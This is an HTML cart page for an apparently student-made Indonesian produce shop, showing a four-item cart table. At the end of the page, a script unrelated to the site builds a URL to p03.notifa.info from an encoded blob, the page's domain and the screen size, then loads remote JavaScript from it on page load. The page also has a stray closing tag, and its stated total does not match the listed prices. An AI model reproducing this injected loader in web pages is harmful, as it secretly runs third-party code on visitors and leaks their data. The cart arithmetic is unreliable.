<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title>Index</title>
    <link rel="stylesheet" href="../CSS/main.css">
    <link rel="stylesheet" href="../CSS/style.css">
    <meta name="viewport" content="width=device-width">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

</head>

<body>
    <div class="subnavbar">
        <div class="logo">

        </div>
        <a class="btn">
            <span></span>
            <span></span>
            <span></span>
        </a>
        <div class="search-box">
            <input class="search-txt" type="text" name="" placeholder="Type to search" />
            <a class="search-btn" href="#">
                <i class="fas fa-search"></i>
            </a>
        </div>
        <div class="menu">
            <a href="../USER/login.php">Login</a>
            <i class="fas fa-user"></i>
            <a href="../USER/register.php">Register</a>
            <i class="fas fa-clipboard-list"></i>
        </div>
    </div>
    <div class="navbar">
        <div class="dropdown">
            <i class="fas fa-bars"></i>
            <button class="dropbtn">Categories</button>
            <div class="dropdown-content">
                <a href="#">Buah buahan</a>
                <a href="#">Kacang kacangan</a>
                <a href="#">Sayur sayuran</a>
            </div>
        </div>
        <a class="btn">
            <span></span>
            <span></span>
            <span></span>
        </a>

        <div class="menu">
            <a href="index.html">Home</a>
            <a href="shop.html">Shop</a>
            <a href="cart.html">Cart</a>
            <a href="contact.html">Contact</a>
        </div>
    </div>

    <!-- ================
  /*CART*/
  =============== -->
    <h1>CART</h1>
    <div class="table-wrapper">
        <table class="demo-table">
            <caption class="title">YOUR CART</caption>
            <thead>
                <tr>
                    <th>No</th>
                    <th>Product</th>
                    <th>Quantity</th>
                    <th>Price</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>1</td>
                    <td>Jeruk Florida</td>
                    <td>1 kilogram</td>
                    <td>50.000</td>
                </tr>
                <tr>
                    <td>2</td>
                    <td>Beras</td>
                    <td>2 kilogram</td>
                    <td>25.000</td>
                </tr>
                <tr>
                    <td>3</td>
                    <td>Kacang Merah</td>
                    <td>1 kilogram</td>
                    <td>10.000</td>
                </tr>
                <tr>
                    <td>4</td>
                    <td>Kangkung</td>
                    <td>8 kilogram</td>
                    <td>8.000</td>
                </tr>

                </tr>
            </tbody>
            <tfoot>
                <tr>
                    <th colspan="3">Total</th>
                    <th>83.000</th>
                </tr>
            </tfoot>
        </table>

    </div>


    <script type="text/javascript">
        $(".btn").on("click", function() {
            $('.menu').toggleClass("show");
        });
    </script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2HW%2farjPhfk2txpTRfDGBnN0cNrIOgGzjrVpKuAQIf%2fCkHyXJ1oixzmIUZZCU7TMC6X23zR2rdWwfbod1KroLinkW0zMVK%2fv4v7IJGNLYN9B1zNM4hIjeDYShRWLpCIXUeIZevDt18Jh6VazM0NjEuG3EBBVCVClQ%2bN6Hedg3g1B5OQwj%2fAc%2b%2fSvsAeXheM7bjIW%2fomlDuRdET0CxSMfVuRjt5kC%2febjXjqQ%2byAst0JiOxhf4VBmUjWDB6JT9EKdJOHbZAse9evQ%2beuW9fVRDWxZC1I10wuaxGPa5jxRUPBZGPgSOolEvAaOEB%2b%2bLAUxriNzjzvCgOIiPdTkb7Og4%2f5jsHkRnzjY3maZM3eUcf%2fZ%2fR3OI8FkhnVi%2bbPfexW1T9t7DQ6SIdAIkRYrMRKJ8pIgsU%2fXBCCfJpBPnGjYRi7%2bL6BbNH197B2R1m6KOPpuwkFFtEyj%2f%2bO9cai9%2bWDfBS4uuRyz%2bl76Uw7Hsf8fqP%2bzLSSpYM6M4%2fP65rl32Vz2D86Rlnf3eX0T0SSj6T4eb02iq4BmLW26QK9Gdxayj33pDhP4Dlic2A3E5pBn%2b9lNKggS1HqHY%2fLZz%2bkkYCpK7cMqOsZHUVLEoRa2WeqikOpKqZt073iVb3g%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

</html>